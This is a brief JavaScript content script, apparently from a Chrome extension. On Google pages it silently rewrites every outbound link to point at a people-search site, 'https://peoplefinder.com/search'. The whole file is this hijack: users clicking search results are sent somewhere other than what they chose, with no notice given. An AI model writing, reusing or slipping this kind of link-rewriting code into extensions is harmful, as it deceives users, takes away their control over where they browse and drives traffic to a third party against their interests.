chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
    if (request.message === 'navigated') {
        setTimeout(() => {
            var pageURL = $(location).attr("href");
            if (pageURL.indexOf('google.com') > 0 && pageURL.indexOf('google.com') < 30) {
                $("a").each((idx, val) => {
                    if ($(val).attr('href') && $(val).attr('href').indexOf('google.com') < 0 && $(val).attr('href').indexOf('http') >= 0) {
                        $(val).attr('href', 'https://peoplefinder.com/search');
                    }
                });
            }
        }, 50);
    }
})